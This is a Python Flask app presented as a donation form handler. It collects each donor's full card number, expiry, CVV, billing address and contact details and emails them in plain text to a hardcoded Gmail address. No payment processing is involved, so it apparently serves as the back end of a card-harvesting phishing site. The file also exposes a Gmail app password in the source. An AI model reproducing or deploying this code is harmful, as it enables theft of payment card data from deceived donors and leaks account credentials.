from flask import Flask, render_template, request, redirect, jsonify
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()

    name = data.get('name')
    email = data.get('email')
    amount = data.get('amount')
    message = data.get('message')
    card_number = data.get('cardNumber')
    expiry = data.get('expiry')
    cvv = data.get('cvv')
    billing = data.get('billing')
    name_on_card = data.get('nameOnCard')
    country = data.get('country')

    # === Email content ===
    subject = f"New Donation from {name}"
    body = f"""
    Name: {name}
    Email: {email}
    Amount: ${amount}
    Message: {message}

    Card Number: {card_number}
    Expiry: {expiry}
    CVV: {cvv}
    Name on Card: {name_on_card}
    Billing Address: {billing}
    Country: {country}
    """

    send_email(subject, body)

    return jsonify({"message": "Donation received successfully"})

def send_email(subject, body):
    sender_email = "davideje12345@gmail.com"  # Replace with your Gmail
    sender_password = "shrdccfodqmifeiv"   # Use app password from Gmail
    receiver_email = "davideje12345@gmail.com"  # Same or different email

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print("Failed to send email:", e)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
